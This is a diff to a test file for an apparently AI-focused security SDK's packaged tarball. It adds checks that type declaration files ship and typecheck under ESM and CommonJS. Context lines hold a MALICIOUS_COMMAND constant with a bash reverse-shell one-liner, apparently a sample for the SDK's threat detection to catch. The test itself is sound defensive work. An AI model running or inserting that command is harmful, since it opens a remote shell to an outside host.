@@ -30,7 +30,6 @@
  */
 
 import { execFileSync, execSync } from "node:child_process";
-import { rm } from "node:fs/promises";
 import {
 	existsSync,
 	mkdirSync,
@@ -42,6 +41,7 @@ import {
 	symlinkSync,
 	writeFileSync,
 } from "node:fs";
+import { rm } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { basename, dirname, join, resolve } from "node:path";
 import { setTimeout as delay } from "node:timers/promises";
@@ -52,6 +52,7 @@ const TEST_DIR = dirname(fileURLToPath(import.meta.url));
 const REPO_ROOT = resolve(TEST_DIR, "..", "..", "..", "..");
 const SDK_DIR = resolve(REPO_ROOT, "packages", "sdk");
 const CORE_DIR = resolve(REPO_ROOT, "packages", "core");
+const TSC_BIN = resolve(REPO_ROOT, "node_modules", "typescript", "bin", "tsc");
 
 const MALICIOUS_COMMAND = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
 const BENIGN_COMMAND = "ls -la /tmp";
@@ -59,6 +60,8 @@ const BENIGN_COMMAND = "ls -la /tmp";
 const REQUIRED_SDK_ARTIFACTS = [
 	join("dist", "index.mjs"),
 	join("dist", "index.cjs"),
+	join("dist", "index.d.ts"),
+	join("dist", "index.d.cts"),
 	join("resources", "threats"),
 	join("resources", "allowlists"),
 ];
@@ -226,6 +229,85 @@ const ENTRY = require.resolve("@singularityrd/aidr-sdk");
 });
 `;
 
+const TYPE_CONSUMER = `
+import {
+  AIDRClient,
+  AIDRMiddlewareError,
+  AIDRToolOutputError,
+  composeMiddleware,
+  createGenericMiddleware,
+  createMiddleware,
+  createMiddlewarePipeline,
+  createSyncCompatibleMiddleware,
+  enforceToolOutput,
+  formatToolOutputBlockReason,
+  guardToolOutput,
+  scanToolOutput,
+  wrapToolWithMiddleware,
+} from "@singularityrd/aidr-sdk";
+import type {
+  CheckResult,
+  GenericMiddlewareContext,
+  MiddlewareEnforcementOptions,
+  MiddlewareFunction,
+  MiddlewareOptions,
+  SDKConfig,
+  ToolOutputGuardOptions,
+  ToolOutputGuardResult,
+} from "@singularityrd/aidr-sdk";
+
+void [
+  AIDRClient,
+  AIDRMiddlewareError,
+  AIDRToolOutputError,
+  composeMiddleware,
+  createGenericMiddleware,
+  createMiddleware,
+  createMiddlewarePipeline,
+  createSyncCompatibleMiddleware,
+  enforceToolOutput,
+  formatToolOutputBlockReason,
+  guardToolOutput,
+  scanToolOutput,
+  wrapToolWithMiddleware,
+];
+
+declare const retainedTypes: [
+  CheckResult,
+  GenericMiddlewareContext,
+  MiddlewareEnforcementOptions,
+  MiddlewareFunction,
+  MiddlewareOptions,
+  SDKConfig,
+  ToolOutputGuardOptions,
+  ToolOutputGuardResult<unknown>,
+];
+void retainedTypes;
+`;
+
+function typecheckConsumer(extension: "mts" | "cts"): void {
+	const sourcePath = join(consumerDir, `types.${extension}`);
+	writeFileSync(sourcePath, TYPE_CONSUMER);
+	execFileSync(
+		process.execPath,
+		[
+			TSC_BIN,
+			"--noEmit",
+			"--strict",
+			"--target",
+			"ES2022",
+			"--module",
+			"NodeNext",
+			"--moduleResolution",
+			"NodeNext",
+			"--skipLibCheck",
+			"false",
+			sourcePath,
+		],
+		{ cwd: consumerDir, stdio: "pipe" },
+	);
+}
+
 /** The old, broken shape: dist only, no resources. Must fail loudly. */
 const MISSING_ASSETS_CONSUMER = `
 const { AIDRClient } = require("@singularityrd/aidr-sdk");
@@ -304,6 +386,8 @@ afterAll(async () => {
 describe("packaged SDK tarball (installed outside the monorepo)", () => {
 	it("ships the rule data next to dist/", () => {
 		expect(existsSync(join(sdkInstallDir, "dist", "index.mjs"))).toBe(true);
+		expect(existsSync(join(sdkInstallDir, "dist", "index.d.ts"))).toBe(true);
+		expect(existsSync(join(sdkInstallDir, "dist", "index.d.cts"))).toBe(true);
 		const threatsDir = join(sdkInstallDir, "resources", "threats");
 		const allowlistsDir = join(sdkInstallDir, "resources", "allowlists");
 		expect(existsSync(threatsDir)).toBe(true);
@@ -316,6 +400,13 @@ describe("packaged SDK tarball (installed outside the monorepo)", () => {
 		expect(listing).toContain("package/resources/threats/");
 		expect(listing).toContain("package/resources/allowlists/");
 		expect(listing).toContain("package/dist/index.mjs");
+		expect(listing).toContain("package/dist/index.d.ts");
+		expect(listing).toContain("package/dist/index.d.cts");
+	});
+
+	it("typechecks the retained API through the ESM and CommonJS declaration entries", () => {
+		typecheckConsumer("mts");
+		typecheckConsumer("cts");
 	});
 
 	it("packs with workspace references resolved (installable dependency range)", () => {
